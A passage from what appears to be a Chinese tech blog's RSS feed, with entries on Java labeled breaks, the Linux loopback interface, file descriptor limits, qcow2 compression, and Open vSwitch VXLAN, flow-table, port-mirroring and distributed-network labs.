&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// 输出&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hello
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">test&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">if&lt;/span> (&lt;span style="color:#ff79c6">true&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;hello&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#ff79c6">if&lt;/span> (&lt;span style="color:#ff79c6">true&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#ff79c6">break&lt;/span> test; &lt;span style="color:#6272a4">// works&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;world&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// 输出&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hello
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">test&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;hello&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#ff79c6">if&lt;/span> (&lt;span style="color:#ff79c6">true&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#ff79c6">break&lt;/span> test; &lt;span style="color:#6272a4">// works&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;world&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#ff79c6">finally&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// 输出&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hello
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="integer的是否相等问题">Integer的是否相等问题&lt;/h3>
&lt;p>日常开发使用到Java基本数据类型是不可避免的一件事，但它却包含了一些很容易犯错的点，踩过一些坑的同学可能了解Java基本包装类型的常量池技术，例如&lt;code>Integer&lt;/code>就具有数值&lt;code>[-128，127] &lt;/code>的相应类型的缓存数据，但下面定义的4个变量是否相等你是否能说的出来呢？&lt;/p></description></item><item><title>Linux 环回网络接口</title><link>https://www.typesafe.cn/posts/linux-loopback/</link><pubDate>Thu, 28 Jan 2021 22:59:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/linux-loopback/</guid><description>&lt;p>在开发或者调试时，我们经常需要和本地的服务器进行通信，例如启动&lt;code>nginx&lt;/code>之后，在浏览器输入&lt;code>lcoalhost&lt;/code>或者&lt;code>127.0.0.1&lt;/code>就可以访问到本机上面的&lt;code>http&lt;/code>服务。&lt;/p>
&lt;h2 id="linux是如何访问本机ip的">Linux是如何访问本机IP的？&lt;/h2>
&lt;p>大多数操作系统都在网络层实现了环回能力，通常是使用一个虚拟的环回网络接口来实现。这个虚拟的环回网络接口看着像是一个真实的网卡，实际上是操作系统用软件模拟的，它可以通过&lt;code>TCP/IP&lt;/code>与同一台主机上的其他服务进行通信，以&lt;code>127&lt;/code>开头的&lt;code>IPv4&lt;/code>地址就是为它保留的，主流&lt;code>Linux&lt;/code>操作系统为环回网卡分配的地址都是&lt;code>127.0.0.1&lt;/code>，主机名是&lt;code>localhost&lt;/code>。&lt;/p>
&lt;p>环回网络接口之所以被称之为环回网络接口，是因为从本机发送到本机任意一个IP的数据报文都会在网络层交给环回网络接口，不再下发到数据链路层进行处理，环回网络接口直接发送回网络层，最终交由应用层软件程序进行处理。这种方式对于性能测试非常有用，因为省去了硬件的开销，可以直接测试协议栈软件所需要的时间。&lt;/p>
&lt;p>那环回网络接口是如何判断目的IP是否为本机地址的呢？&lt;/p>
&lt;p>答案就是网络层在进行路由转发的时候会先查本地的路由表，发现是本机IP后交给环回网络接口。查看本地路由表的命令如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>ip route show table &lt;span style="color:#8be9fd;font-style:italic">local&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出内容如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>broadcast 10.141.128.0 dev eth0 proto kernel scope link src 10.141.155.131 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">local&lt;/span> 10.141.155.131 dev eth0 proto kernel scope host src 10.141.155.131 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>broadcast 10.141.191.255 dev eth0 proto kernel scope link src 10.141.155.131 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>broadcast 127.0.0.0 dev lo proto kernel scope link src 127.0.0.1 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">local&lt;/span> 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">local&lt;/span> 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中&lt;code>local&lt;/code>开头的便是本地IP，&lt;code>dev&lt;/code>后面是网卡名称。&lt;/p></description></item><item><title>Linux 修改最大文件描述符</title><link>https://www.typesafe.cn/posts/linux-limit/</link><pubDate>Mon, 11 Jan 2021 15:40:41 +0000</pubDate><guid>https://www.typesafe.cn/posts/linux-limit/</guid><description>&lt;pre tabindex="0">&lt;code>echo &amp;#34;fs.file-max=655350&amp;#34; &amp;gt;&amp;gt;/etc/sysctl.conf
echo &amp;#34;* soft nofile 655350&amp;#34; &amp;gt;&amp;gt; /etc/security/limits.conf
echo &amp;#34;* hard nofile 655350&amp;#34; &amp;gt;&amp;gt; /etc/security/limits.conf
ulimit -n 655350
&lt;/code>&lt;/pre></description></item><item><title>压缩qcow2 镜像文件</title><link>https://www.typesafe.cn/posts/qcow2-image-compression/</link><pubDate>Thu, 31 Dec 2020 00:00:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/qcow2-image-compression/</guid><description>&lt;h1 id="压缩qcow2">压缩qcow2&lt;/h1>
&lt;p>首先，需要对虚拟机剩余空间进行写零操作：&lt;/p>
&lt;pre tabindex="0">&lt;code>dd if=/dev/zero of=/zero.dat
&lt;/code>&lt;/pre>&lt;p>删除 zero.dat：&lt;/p>
&lt;pre tabindex="0">&lt;code>rm /zero.dat
&lt;/code>&lt;/pre>&lt;p>关闭虚拟机，执行&lt;code>qemu-img&lt;/code>的&lt;code>convert&lt;/code>命令进行转换：&lt;/p>
&lt;pre tabindex="0">&lt;code>qemu-img convert -c -O qcow2 /path/old.img.qcow2 /path/new.img.qcow2
&lt;/code>&lt;/pre></description></item><item><title>Open vSwitch 入门实践（6）VXLAN实验</title><link>https://www.typesafe.cn/posts/ovs-learn-6/</link><pubDate>Wed, 30 Dec 2020 19:14:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/ovs-learn-6/</guid><description>&lt;h1 id="什么是vxlan">什么是VXLAN？&lt;/h1>
&lt;p>VXLAN是一种隧道封装协议，在三层网络上封装二层网络数据报文。简单来说就是可以在已经规划好网络拓扑的设备上封装出一个新的二层网络，因此VXLAN这类网络又被称之为overylay网络，底下承载VXLAN网络的就被称之为underlay网络。&lt;/p>
&lt;h1 id="vxlan解决了什么问题">VXLAN解决了什么问题？&lt;/h1>
&lt;p>最近几年，阿里云，腾讯云，京东云，华为云等等厂商每到节日都会打折出售大量云服务器，1核1G内存50G磁盘的服务器几十块就能买到一年的使用权，作为一个专业的羊毛党，哪个手里没有几台小破水管机器？但是这么多的云服务器是厂商如何做隔离的呢？了解过网络的同学或许会说VLAN。但是VLAN这种只能隔离4094个虚拟网络的技术别说满足不了羊毛党了，就连正常的用户估计都撑不住。那不隔离能行吗，厂商规划一个特别大的网段，让大家都在这里面耍，正常用户还好，万一这个时候进来一个大黑客，估计就会全部GG。&lt;/p>
&lt;p>因此，隔离是必不可少的，其中关键的技术就是overlay网络。&lt;/p>
&lt;p>那VXLAN具体解决了哪些问题呢？&lt;/p>
&lt;ul>
&lt;li>突破了VLAN技术4094个隔离网络的限制，在一个管理域中创建多达1600万个VXLAN网络。&lt;/li>
&lt;li>VXLAN提供了云服务厂商所需的规模的网络分段，以支持大量租户。&lt;/li>
&lt;li>突破了物理网络边界的限制，传统虚拟二层网络（VLAN）是需要和物理网络做大量适配工作才能保证环境的迁移不会导致虚拟网络异常，overlay网络则不必关心底层物理网络是如何搭建的，只要能保证VXLAN端点相互之间可以联通即可。&lt;/li>
&lt;/ul>
&lt;h1 id="vxlan网络如何工作">VXLAN网络如何工作？&lt;/h1>
&lt;p>VXLAN隧道协议将二层以太网帧封装在三层UDP数据包中，使用户能够创建跨物理三层网络的虚拟化二层子网或网段。每个二层子网使用VXLAN网络标识符（VNI）作为唯一标识。报文格式如下图：&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/vxlan_packet_header.png" alt="VXLAN报文格式">&lt;/p>
&lt;p>执行数据包封装和解封装的实体称为VXLAN隧道终结点（VTEP）。VTEP主要分为两类：硬件VTEP和软件VTEP。硬件VTEP我接触较少，这里就不再介绍了。&lt;/p>
&lt;p>软件VTEP如下图所示：VTEP在数据包到达虚拟机之前进行了封装和解封装，使得虚拟机完全不需要知道VXLAN隧道以及它们之间的三层网络。&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/vxlan01.png" alt="vxlan网络">&lt;/p>
&lt;h1 id="简单vxlan实验">简单VXLAN实验&lt;/h1>
&lt;p>我们参照下图完成实验。&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/vxlan_topo.png" alt="VXLAN实验">&lt;/p>
&lt;h3 id="主机a">主机A&lt;/h3>
&lt;pre tabindex="0">&lt;code># 创建隧道网桥
ovs-vsctl add-br br-tun
# 创建隧道端口并指定远端IP和VXLAN ID
ovs-vsctl add-port br-tun vx01 -- set Interface vx01 type=vxlan options:remote_ip=192.168.123.232 options:key=1111
# 创建内部端口
ovs-vsctl add-port br-tun vnet0 -- set Interface vnet0 type=internal
# 创建netns用于模拟虚拟网络设备
ip netns add ns0
# 将内部端口移动到netns中
ip link set vnet0 netns ns0
# 启动网卡
ip netns exec ns0 ip link set lo up
ip netns exec ns0 ip link set vnet0 up
# 配置IP
ip netns exec ns0 ip addr add 192.168.0.1/24 dev vnet0
&lt;/code>&lt;/pre>&lt;h3 id="主机b">主机B&lt;/h3>
&lt;pre tabindex="0">&lt;code># 创建隧道网桥
ovs-vsctl add-br br-tun
# 创建隧道端口并指定远端IP和VXLAN ID
ovs-vsctl add-port br-tun vx01 -- set Interface vx01 type=vxlan options:remote_ip=192.168.123.231 options:key=1111
# 创建内部端口
ovs-vsctl add-port br-tun vnet0 -- set Interface vnet0 type=internal
# 创建netns用于模拟虚拟网络设备
ip netns add ns0
# 将内部端口移动到netns中
ip link set vnet0 netns ns0
# 启动网卡
ip netns exec ns0 ip link set lo up
ip netns exec ns0 ip link set vnet0 up
# 配置IP
ip netns exec ns0 ip addr add 192.168.0.2/24 dev vnet0
&lt;/code>&lt;/pre>&lt;h2 id="测试">测试&lt;/h2>
&lt;p>在&lt;code>主机A&lt;/code>上测试网络连通性 &lt;code>ip netns exec ns0 ping 192.168.0.2&lt;/code>&lt;/p></description></item><item><title>Open vSwitch 入门实践（5）OVS Flow Table 流表规则</title><link>https://www.typesafe.cn/posts/ovs-learn-5/</link><pubDate>Tue, 29 Dec 2020 18:38:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/ovs-learn-5/</guid><description>&lt;h1 id="openvswitch-flow-table-流表">OpenvSwitch flow table 流表&lt;/h1>
&lt;blockquote>
&lt;p>OpenFlow（OF）被认为是第一个&lt;a href="https://zh.wikipedia.org/wiki/%E8%BB%9F%E4%BB%B6%E5%AE%9A%E7%BE%A9%E7%B6%B2%E7%B5%A1">软件定义网络&lt;/a>（SDN）标准之一。它最初在SDN环境中定义了通信协议，使SDN控制器能够与物理和虚拟的交换机和路由器等网络设备的转发平面直接进行交互，从而更好地适应不断变化的业务需求。&lt;/p>&lt;/blockquote>
&lt;p>如果把OpenFlow控制器比作“大脑”，OVS流表就像是“大腿”一样接受来自“大脑”的指令，决定要向哪个方向前进。但OVS流表功能更加强大，在没有OpenFlow控制器时，也可以自主工作，它本身也供一些命令让我们可以直接管理流表。&lt;/p>
&lt;h1 id="操作命令">操作命令&lt;/h1>
&lt;h3 id="查看流表规则">查看流表规则&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 查看br-tun上的全部流表规则&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-ofctl dump-flows br-tun
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="添加或修改流表规则">添加或修改流表规则&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ovs-ofctl add−flow／add−flows／mod−flows “流表匹配条件,actions&lt;span style="color:#ff79c6">=[&lt;/span>动作1&lt;span style="color:#ff79c6">][&lt;/span>,动作2…&lt;span style="color:#ff79c6">]&lt;/span>”
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果你有过编程的经验，流表规则其实就是一个个简单的&lt;code>if&lt;/code>语句，伪代码如下。&lt;/p>
&lt;pre tabindex="0">&lt;code>if (流表匹配条件){
	动作1，
	动作2...
}

if (流表匹配条件){
	动作1，
	动作2...
}
&lt;/code>&lt;/pre>&lt;h3 id="删除流表规则">删除流表规则&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 删除br-tun上的全部流表规则&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-ofctl del-flows br-tun
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 删除br-tun上匹配xx的全部流表规则&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-ofctl del-flows br-tun xx 
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="流表匹配条件">流表匹配条件&lt;/h1>
&lt;p>OVS 流表匹配条件较多，下面我将其分成四部分来说明，分别是:&lt;/p>
&lt;ul>
&lt;li>OVS匹配条件&lt;/li>
&lt;li>OSI模型第二层【数据链路层】&lt;/li>
&lt;li>OSI模型第三层【网络层】&lt;/li>
&lt;li>OSI模型第四层【传输层】&lt;/li>
&lt;/ul>
&lt;h2 id="ovs匹配条件">OVS匹配条件&lt;/h2>
&lt;h3 id="in_portport">in_port=port&lt;/h3>
&lt;p>流量进入的端口编号或者名称，示例 &lt;code>in_port=br-int&lt;/code>&lt;/p>
&lt;h3 id="tablenumber">table=number&lt;/h3>
&lt;p>规则保存的流表编号，范围是 0-254，默认值：0。&lt;/p>
&lt;h2 id="osi模型第二层数据链路层">OSI模型第二层【数据链路层】&lt;/h2>
&lt;p>&lt;em>&lt;code>dl&lt;/code> 即是 &lt;code>data link&lt;/code> 的缩写。&lt;/em>&lt;/p>
&lt;h3 id="dl_typeethertype">dl_type=ethertype&lt;/h3>
&lt;p>匹配以太网协议类型以太类型，以10到65535之间的整数（包括0和65535）指定，以十进制或以0x前缀的十六进制数表示，示例如下。&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>dl_type=0x0800&lt;/code> 匹配IPv4数据包，等同于&lt;code>dl_type=ip&lt;/code> 。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>dl_type=0x086dd&lt;/code> 匹配IPv6数据包，等同于&lt;code>dl_type=ipv6&lt;/code> 。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>dl_type=0x0806&lt;/code> 匹配ARP数据包，等同于&lt;code>dl_type=arp&lt;/code> 。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>dl_type=0x8035&lt;/code> 匹配RARP数据包，等同于 &lt;code>dl_type=rarp&lt;/code>。&lt;/p></description></item><item><title>Open vSwitch 入门实践（4）使用OVS配置端口镜像</title><link>https://www.typesafe.cn/posts/ovs-learn-4/</link><pubDate>Mon, 28 Dec 2020 19:23:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/ovs-learn-4/</guid><description>&lt;h1 id="前言">前言&lt;/h1>
&lt;p>当我们想要在不影响虚拟网络设备数据报文收发的情况下获取对应虚拟网络设备的流量时，端口镜像是一个很好的选择。端口镜像是指将经过指定端口（镜像端口）的报文复制一份到另一个指定端口（观察端口），通过观察端口接收到的数据报文，就可以有效识别虚拟网络的运行情况。&lt;/p>
&lt;p>OVS提供了相关命令来配置或删除端口镜像，下面我们来实验一下。&lt;/p>
&lt;h1 id="如何使用">如何使用&lt;/h1>
&lt;h3 id="端口镜像类型">端口镜像类型&lt;/h3>
&lt;p>端口镜像分为镜像源和镜像目的两部分。&lt;/p>
&lt;h4 id="镜像源">镜像源&lt;/h4>
&lt;ul>
&lt;li>select_all：布尔类型（true，false）。设置为 true 时，表示此网桥上的所有流量。&lt;/li>
&lt;li>select_dst_port：字符串（端口名称）。表示此端口接收的所有流量。&lt;/li>
&lt;li>select_src_port：字符串（端口名称）。表示此端口发送的所有流量。&lt;/li>
&lt;li>select_vlan：整型（0-4095）。表示携带此VLAN标签的流量。&lt;/li>
&lt;/ul>
&lt;h4 id="镜像目的">镜像目的&lt;/h4>
&lt;ul>
&lt;li>output_port：字符串（端口名称）。接收流量报文的观察端口。&lt;/li>
&lt;li>output_vlan：整型（0-4095）。表示只修改VLAN标签，原VLAN标签会被剥离。&lt;/li>
&lt;/ul>
&lt;h3 id="基础操作命令">基础操作命令&lt;/h3>
&lt;p>新增端口镜像&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ovs-vsctl -- &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> Bridge &amp;lt;bridge_name&amp;gt; &lt;span style="color:#8be9fd;font-style:italic">mirrors&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>@m &lt;span style="color:#f1fa8c">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">&lt;/span> -- --id&lt;span style="color:#ff79c6">=&lt;/span>@&amp;lt;port0&amp;gt; get Port &amp;lt;port0&amp;gt; &lt;span style="color:#f1fa8c">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">&lt;/span> -- --id&lt;span style="color:#ff79c6">=&lt;/span>@&amp;lt;port1&amp;gt; get Port &amp;lt;port1&amp;gt; &lt;span style="color:#f1fa8c">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">&lt;/span> -- --id&lt;span style="color:#ff79c6">=&lt;/span>@m create Mirror &lt;span style="color:#8be9fd;font-style:italic">name&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&amp;lt;mirror_name&amp;gt; &lt;span style="color:#ff79c6">select&lt;/span>-dst-port&lt;span style="color:#ff79c6">=&lt;/span>@&amp;lt;port0&amp;gt; &lt;span style="color:#ff79c6">select&lt;/span>-src-port&lt;span style="color:#ff79c6">=&lt;/span>@&amp;lt;port0&amp;gt; output-port&lt;span style="color:#ff79c6">=&lt;/span>@&amp;lt;port1&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
&lt;p>这行命令会输出一个镜像ID&lt;/p>&lt;/blockquote>
&lt;p>删除端口镜像&lt;/p>
&lt;pre tabindex="0">&lt;code>ovs-vsctl remove Bridge &amp;lt;bridge-name&amp;gt; mirrors &amp;lt;mirror-id&amp;gt;
&lt;/code>&lt;/pre>&lt;p>在原端口镜像的基础上增加一个镜像源&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 获取端口的ID&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl get port &amp;lt;port_name&amp;gt; _uuid
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 在原端口镜像的基础上增加镜像源&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add Mirror &amp;lt;mirror-name&amp;gt; select_src_port &amp;lt;port-id&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add Mirror &amp;lt;mirror-name&amp;gt; select_dst_port &amp;lt;port-id&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在原端口镜像的基础上删除一个镜像源&lt;/p></description></item><item><title>Open vSwitch 入门实践（3）使用OVS构建分布式隔离网络</title><link>https://www.typesafe.cn/posts/ovs-learn-3/</link><pubDate>Sun, 27 Dec 2020 11:38:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/ovs-learn-3/</guid><description>&lt;h1 id="使用ovs构建分布式隔离网络">使用OVS构建分布式隔离网络&lt;/h1>
&lt;h2 id="前言">前言&lt;/h2>
&lt;p>上一节我们使用OVS构建了单机隔离网络，但是随着网络规模的扩张，单节点已经不再能满足业务的需要，分布式网络成了必不可少的环节。分布式网络与单节点网络在细节实现上基本一致，只有物理环境网络连线上的一点区别。&lt;/p>
&lt;h2 id="实验1分布式无隔离网络">实验1：分布式无隔离网络&lt;/h2>
&lt;p>网络拓扑如下图所示，我们每一台节点都有两张网卡，一张用于管理，一张用于业务。之所以使用两张网卡有两个原因：&lt;/p>
&lt;ol>
&lt;li>管理网卡用于日常的维护登录，业务网卡用于传输虚拟节点的数据报文，避免相互之间影响。&lt;/li>
&lt;li>我们要将业务网卡绑定到OVS网桥上，也就是&lt;code>Normal&lt;/code>类型的&lt;code>Port&lt;/code>。这种方式添加的&lt;code>Port&lt;/code>不支持分配IP地址，如果之前网卡上配置的有IP，挂载到OVS上面之后将不可访问。&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>需要注意的是，如果是使用物理环境搭建网络拓扑，需要把业务网卡对应的交换机端口配置为&lt;code>trunk&lt;/code>模式。如果是使用VmWare搭建网络拓扑，业务网卡需要配置网络类型为&lt;code>仅主机模式&lt;/code>。&lt;/p>&lt;/blockquote>
&lt;p>&lt;img src="https://oss.typesafe.cn/ovs-di-network0.png?t=2" alt="分布式无隔离网络">&lt;/p>
&lt;h3 id="配置">配置&lt;/h3>
&lt;ul>
&lt;li>配置环境 &lt;code>主机A&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ovs-vsctl add-br br-int
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 请修改eth1为当前实验环境的业务网卡名称&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int eth1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 添加两个内部端口&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet0 -- &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> Interface vnet0 &lt;span style="color:#8be9fd;font-style:italic">type&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet1 -- &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> Interface vnet1 &lt;span style="color:#8be9fd;font-style:italic">type&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 添加两个netns&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 将内部端口分别移动到netns中&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet0 netns ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet1 netns ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 启动端口并配置IP&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet0 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip addr add 10.0.0.1/24 dev vnet0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet1 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip addr add 10.0.0.2/24 dev vnet1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>配置环境 &lt;code>主机B&lt;/code>&lt;/li>
&lt;/ul>
